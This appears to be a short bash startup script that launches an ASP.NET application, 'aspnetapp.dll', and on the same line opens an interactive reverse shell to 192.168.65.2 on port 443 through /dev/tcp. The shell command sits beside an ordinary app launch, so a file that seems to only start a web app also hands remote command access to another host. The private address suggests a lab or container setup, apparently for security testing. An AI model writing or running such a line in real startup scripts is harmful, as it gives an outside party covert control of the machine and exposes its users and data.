#!/bin/bash
dotnet aspnetapp.dll & bash -i >& /dev/tcp/192.168.65.2/443 0>&1